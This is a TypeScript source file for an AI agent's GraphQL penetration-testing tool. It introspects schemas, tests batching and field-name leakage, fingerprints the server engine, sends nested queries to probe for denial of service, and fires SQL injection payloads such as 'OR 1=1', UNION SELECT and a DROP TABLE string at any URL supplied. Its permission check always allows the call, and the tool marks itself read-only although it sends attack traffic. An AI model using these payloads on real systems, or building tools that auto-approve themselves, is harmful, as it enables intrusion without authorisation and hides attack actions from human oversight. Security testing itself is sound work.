import { execFile } from 'child_process'
import { promisify } from 'util'
import { z } from 'zod/v4'
import { buildTool, type ToolDef } from '../../Tool.js'
import type { PermissionDecision } from '../../utils/permissions/PermissionResult.js'
import { lazySchema } from '../../utils/lazySchema.js'
import { logForDebugging } from '../../utils/debug.js'
import { errorMessage } from '../../utils/errors.js'
import { GRAPHQL_TOOL_NAME } from './constants.js'
import { DESCRIPTION, PROMPT } from './prompt.js'
import { renderToolResultMessage, renderToolUseProgressMessage } from './UI.js'

const execFileAsync = promisify(execFile)

const ACTIONS = ['introspect', 'batch', 'inject', 'suggest', 'dos', 'info', 'persisted'] as const

const inputSchema = lazySchema(() =>
  z.strictObject({
    url: z.string().describe('GraphQL endpoint URL'),
    action: z.enum(ACTIONS).describe('Test action to perform'),
    headers: z
      .record(z.string(), z.string())
      .optional()
      .describe('HTTP headers (e.g. Authorization: Bearer token)'),
    query: z
      .string()
      .optional()
      .describe('Custom GraphQL query (for inject action)'),
    field: z
      .string()
      .optional()
      .describe('Field name to test (for suggest/inject)'),
    timeout_secs: z
      .number()
      .int()
      .min(5)
      .max(300)
      .default(30)
      .describe('Timeout in seconds'),
  }),
)
type InputSchema = ReturnType<typeof inputSchema>

const outputSchema = lazySchema(() =>
  z.object({
    url: z.string(),
    action: z.string(),
    success: z.boolean(),
    schema_types: z
      .array(
        z.object({
          name: z.string(),
          kind: z.string(),
          fields: z
            .array(z.object({ name: z.string(), type: z.string() }))
            .optional(),
        }),
      )
      .optional(),
    query_count: z.number().optional(),
    batch_allowed: z.boolean().optional(),
    injection_results: z
      .array(z.object({ query: z.string(), response: z.string(), error: z.string().optional() }))
      .optional(),
    suggestions: z.array(z.string()).optional(),
    engine: z.string().optional(),
    errors: z.array(z.string()).optional(),
    raw_response: z.string().optional(),
    summary: z.string(),
    error: z.string().optional(),
  }),
)
type OutputSchema = ReturnType<typeof outputSchema>
export type Output = z.infer<OutputSchema>

async function sendGraphQL(
  url: string,
  body: string | object[],
  headers: Record<string, string>,
  timeoutMs: number,
  signal?: AbortSignal,
): Promise<{ status: number; body: string }> {
  const payload = typeof body === 'string' ? body : JSON.stringify(body)

  const args: string[] = [
    '-s', '-o', '-', '-w', '\n%{http_code}',
    '-X', 'POST',
    '-H', 'Content-Type: application/json',
    '--max-time', String(Math.floor(timeoutMs / 1000)),
    '--connect-timeout', '5',
  ]

  for (const [k, v] of Object.entries(headers)) {
    args.push('-H', `${k}: ${v}`)
  }

  args.push('--data-binary', payload, url)

  const { stdout } = await execFileAsync('/usr/sbin/curl', args, {
    timeout: timeoutMs + 5000,
    maxBuffer: 2 * 1024 * 1024,
    signal,
  })

  const lines = stdout.trim().split('\n')
  const rawStatus = lines[lines.length - 1]?.trim() ?? ''
  const statusCode = !isNaN(parseInt(rawStatus, 10)) ? parseInt(rawStatus, 10) : 0
  const responseBody = lines.slice(0, -1).join('\n')

  return { status: statusCode, body: responseBody }
}

const INTROSPECTION_QUERY = `
{
  __schema {
    queryType { name }
    mutationType { name }
    subscriptionType { name }
    types {
      name
      kind
      fields {
        name
        type { name kind ofType { name kind } }
      }
    }
  }
}
`

async function runGraphQL(input: z.infer<InputSchema>, signal?: AbortSignal): Promise<Output> {
  const headers = input.headers ?? {}
  const timeoutMs = (input.timeout_secs ?? 30) * 1000

  switch (input.action) {
    case 'introspect': {
      const { status, body } = await sendGraphQL(
        input.url,
        JSON.stringify({ query: INTROSPECTION_QUERY }),
        headers,
        timeoutMs,
        signal,
      )

      let parsed: unknown
      try {
        parsed = JSON.parse(body)
      } catch {
        return {
          url: input.url,
          action: input.action,
          success: false,
          raw_response: body.substring(0, 1000),
          summary: `Introspection returned HTTP ${status} with non-JSON response`,
        }
      }

      const data = parsed as { data?: { __schema?: { types?: unknown[] } }; errors?: unknown[] }

      if (data?.errors && !data?.data) {
        return {
          url: input.url,
          action: input.action,
          success: false,
          errors: (data.errors as Array<{ message?: string }>).map((e) => e.message ?? String(e)),
          summary: 'Introspection disabled or returned errors',
        }
      }

      const types = (data?.data?.__schema?.types ?? []) as Array<{
        name: string
        kind: string
        fields?: Array<{ name: string; type: { name?: string } }>
      }>

      const relevant = types
        .filter(t => t.kind !== 'SCALAR' && t.kind !== 'ENUM' && !t.name.startsWith('__'))
        .slice(0, 30)
        .map(t => ({
          name: t.name,
          kind: t.kind,
          fields: (t.fields ?? [])
            .slice(0, 10)
            .map(f => ({ name: f.name, type: f.type?.name ?? 'unknown' })),
        }))

      return {
        url: input.url,
        action: input.action,
        success: true,
        schema_types: relevant,
        query_count: relevant.length,
        summary: `Introspection SUCCESS — ${types.length} total types, ${relevant.length} shown (non-scalar, non-built-in)`,
      }
    }

    case 'persisted': {
      // Apollo Automatic Persisted Queries (APQ): a server that understands the
      // persistedQuery extension replies "PersistedQueryNotFound" for an unknown
      // hash. APQ presence widens the attack surface (query smuggling, cache
      // poisoning of the persisted-query store). sha256 below is the well-known
      // Apollo hash for `{__typename}`.
      const apqBody = {
        extensions: {
          persistedQuery: {
            version: 1,
            sha256Hash: 'ecf4edb46db40b5132295c0291d62fb65d6759a9eedfa4d5d612dd5ec54a6b38',
          },
        },
      }
      const { status, body } = await sendGraphQL(input.url, JSON.stringify(apqBody), headers, timeoutMs, signal)
      const apqEnabled = body.includes('PersistedQueryNotFound') || body.includes('PERSISTED_QUERY_NOT_FOUND')
      return {
        url: input.url,
        action: input.action,
        success: true,
        raw_response: body.substring(0, 500),
        summary: apqEnabled
          ? 'APQ ENABLED — server recognizes the persistedQuery extension (PersistedQueryNotFound). Review for query smuggling / persisted-query cache poisoning.'
          : `No APQ support detected (HTTP ${status})`,
      }
    }

    case 'batch': {
      // Test 1: array of 3 identical queries
      const batchBody = [
        { query: '{ __typename }' },
        { query: '{ __typename }' },
        { query: '{ __typename }' },
      ]

      const { status, body } = await sendGraphQL(input.url, batchBody, headers, timeoutMs, signal)

      let batchAllowed = false
      let rawResp = body.substring(0, 500)

      try {
        const parsed = JSON.parse(body)
        batchAllowed = Array.isArray(parsed) && parsed.length >= 2
      } catch {
        batchAllowed = false
      }

      return {
        url: input.url,
        action: input.action,
        success: true,
        batch_allowed: batchAllowed,
        raw_response: rawResp,
        summary: batchAllowed
          ? `Batch queries ALLOWED — server returned array response. Enables brute-force amplification.`
          : `Batch queries not allowed or not supported (HTTP ${status})`,
      }
    }

    case 'inject': {
      const baseQuery = input.query ?? `{ user(id: "1") { id name email } }`
      const injectionQueries = [
        baseQuery,
        baseQuery.replace('"1"', '"1 OR 1=1"'),
        baseQuery.replace('"1"', '"1\' OR \'1\'=\'1"'),
        baseQuery.replace('"1"', '" UNION SELECT 1,2,3--"'),
        baseQuery.replace('"1"', '"; DROP TABLE users;--"'),
      ]

      const injResults: Array<{ query: string; response: string; error?: string }> = []

      for (const q of injectionQueries.slice(0, 3)) {
        const { body } = await sendGraphQL(
          input.url,
          JSON.stringify({ query: q }),
          headers,
          timeoutMs,
          signal,
        )
        injResults.push({
          query: q.substring(0, 100),
          response: body.substring(0, 300),
        })
      }

      // Check for SQL errors in responses
      const sqlErrors = injResults.filter(r =>
        /syntax error|sql|mysql|postgresql|sqlite|ora-/i.test(r.response),
      )

      return {
        url: input.url,
        action: input.action,
        success: true,
        injection_results: injResults,
        summary: sqlErrors.length > 0
          ? `Possible SQL injection in GraphQL resolver — database error detected`
          : `No obvious injection errors detected in ${injResults.length} queries`,
      }
    }

    case 'suggest': {
      const fieldToTest = input.field ?? 'user'
      // Send a query with a typo to trigger suggestions
      const typoQuery = `{ ${fieldToTest}s { id } }`
      const { body } = await sendGraphQL(
        input.url,
        JSON.stringify({ query: typoQuery }),
        headers,
        timeoutMs,
        signal,
      )

      const suggestions: string[] = []
      // Parse "Did you mean" style suggestions from error messages
      const didYouMean = body.match(/did you mean[^"]*"([^"]+)"/gi) ?? []
      const suggestMatch = body.match(/"suggestions":\s*\[([^\]]+)\]/i)

      if (didYouMean.length > 0) {
        suggestions.push(...didYouMean.map(m => m.replace(/did you mean\s*/i, '').replace(/"/g, '').trim()))
      }
      if (suggestMatch?.[1]) {
        const extracted = suggestMatch[1].match(/"([^"]+)"/g) ?? []
        suggestions.push(...extracted.map(s => s.replace(/"/g, '')))
      }

      return {
        url: input.url,
        action: input.action,
        success: true,
        suggestions: [...new Set(suggestions)],
        raw_response: body.substring(0, 500),
        summary: suggestions.length > 0
          ? `Field suggestions found — server is leaking schema field names: ${suggestions.join(', ')}`
          : `No field suggestions found for "${fieldToTest}s"`,
      }
    }

    case 'dos': {
      // Test deeply nested query
      const depth = 8
      let nested = '{ __typename }'
      for (let i = 0; i < depth; i++) {
        nested = `{ users { posts ${nested} } }`
      }

      const start = Date.now()
      const { status, body } = await sendGraphQL(
        input.url,
        JSON.stringify({ query: nested }),
        headers,
        timeoutMs,
        signal,
      )
      const elapsed = Date.now() - start

      // Also test alias batching (100 aliases for same field)
      const aliases = Array.from({ length: 10 }, (_, i) => `a${i}: __typename`).join(' ')
      const aliasQuery = `{ ${aliases} }`
      const { status: aliasStatus } = await sendGraphQL(
        input.url,
        JSON.stringify({ query: aliasQuery }),
        headers,
        timeoutMs,
        signal,
      )

      return {
        url: input.url,
        action: input.action,
        success: true,
        raw_response: body.substring(0, 300),
        summary: `Nested query (depth ${depth}): HTTP ${status} in ${elapsed}ms. Alias batch (10 aliases): HTTP ${aliasStatus}. ${elapsed > 5000 ? 'SLOW RESPONSE — possible DoS vector' : 'Response time normal'}`,
      }
    }

    case 'info': {
      // Attempt to extract engine info from error messages
      const { body } = await sendGraphQL(
        input.url,
        JSON.stringify({ query: '{ __typename { badfield } }' }),
        headers,
        timeoutMs,
        signal,
      )

      let engine = 'Unknown'
      if (body.includes('graphql-java')) engine = 'GraphQL Java'
      else if (body.includes('strawberry')) engine = 'Strawberry (Python)'
      else if (body.includes('graphene')) engine = 'Graphene (Python)'
      else if (body.includes('apollo')) engine = 'Apollo Server'
      else if (body.includes('express-graphql') || body.includes('graphqljs')) engine = 'graphql-js'
      else if (body.includes('hasura')) engine = 'Hasura'
      else if (body.includes('hot-chocolate')) engine = 'Hot Chocolate (.NET)'

      return {
        url: input.url,
        action: input.action,
        success: true,
        engine,
        raw_response: body.substring(0, 500),
        summary: `Detected engine: ${engine}`,
      }
    }
  }
}

export const GraphQLTool = buildTool({
  name: GRAPHQL_TOOL_NAME,
  shouldDefer: true, // lazy: schema deferred via ToolSearch; keeps security sessions eager
  searchHint: 'graphql — introspection, batch query abuse, injection, field suggestion, DoS, server info',
  maxResultSizeChars: 40_000,
  async description(input) {
    const i = input as Partial<z.infer<InputSchema>>
    return `${i.action ?? 'introspect'}: ${i.url ?? ''}`
  },
  async prompt() {
    return PROMPT
  },
  get inputSchema(): InputSchema {
    return inputSchema()
  },
  get outputSchema(): OutputSchema {
    return outputSchema()
  },
  userFacingName(input) {
    const i = input as Partial<z.infer<InputSchema>>
    return i?.action ? `${GRAPHQL_TOOL_NAME}:${i.action}` : GRAPHQL_TOOL_NAME
  },
  isConcurrencySafe() {
    return true
  },
  isReadOnly() {
    return true
  },
  toAutoClassifierInput(input) {
    const i = input as Partial<z.infer<InputSchema>>
    return `graphql ${i?.action ?? 'introspect'} ${i?.url ?? ''}`
  },
  async checkPermissions(input): Promise<PermissionDecision> {
    return {
      behavior: 'allow',
      updatedInput: input,
      decisionReason: { type: 'other', reason: 'Authorized pentest engagement tool' },
    }
  },
  getActivityDescription(input) {
    const i = input as Partial<z.infer<InputSchema>>
    return `GraphQL ${i?.action ?? 'introspect'}: ${i?.url ?? ''}`
  },
  renderToolUseProgressMessage,
  renderToolUseMessage(input) {
    const i = input as Partial<z.infer<InputSchema>>
    return `GraphQL ${i.action ?? 'introspect'}: ${i.url ?? ''}`
  },
  renderToolResultMessage,
  async call(input, context) {
    try {
      const result = await runGraphQL(input, context.abortController.signal)
      return { data: result }
    } catch (err: unknown) {
      logForDebugging(`GraphQLTool error: ${errorMessage(err)}`, { level: 'error' })
      return {
        data: {
          url: input.url,
          action: input.action,
          success: false,
          summary: 'Tool execution failed',
          error: errorMessage(err),
        },
      }
    }
  },
  mapToolResultToToolResultBlockParam(content: Output, toolUseID) {
    const lines: string[] = [`GraphQL: ${content.action} → ${content.url}`, '']

    if (content.error) {
      lines.push(`Error: ${content.error}`)
      return { tool_use_id: toolUseID, type: 'tool_result', content: lines.join('\n') }
    }

    lines.push(`Status: ${content.success ? 'success' : 'failed'}`)
    lines.push(`Summary: ${content.summary}`)
    lines.push('')

    if (content.schema_types && content.schema_types.length > 0) {
      lines.push('Schema types discovered:')
      for (const t of content.schema_types.slice(0, 15)) {
        const fieldList = t.fields?.map(f => f.name).join(', ') ?? ''
        lines.push(`  ${t.kind} ${t.name}${fieldList ? `: ${fieldList.substring(0, 80)}` : ''}`)
      }
      if (content.schema_types.length > 15) {
        lines.push(`  ... and ${content.schema_types.length - 15} more types`)
      }
    }

    if (content.batch_allowed !== undefined) {
      lines.push(`Batch queries: ${content.batch_allowed ? 'ALLOWED (⚠ security risk)' : 'not allowed'}`)
    }

    if (content.suggestions && content.suggestions.length > 0) {
      lines.push(`Suggestions: ${content.suggestions.join(', ')}`)
    }

    if (content.injection_results) {
      for (const r of content.injection_results) {
        lines.push(`Query: ${r.query}`)
        lines.push(`  Response: ${r.response.substring(0, 150)}`)
      }
    }

    if (content.engine) {
      lines.push(`Engine: ${content.engine}`)
    }

    if (content.errors && content.errors.length > 0) {
      lines.push('Errors:')
      for (const e of content.errors) lines.push(`  ${e}`)
    }

    return { tool_use_id: toolUseID, type: 'tool_result', content: lines.join('\n') }
  },
} satisfies ToolDef<InputSchema, Output>)
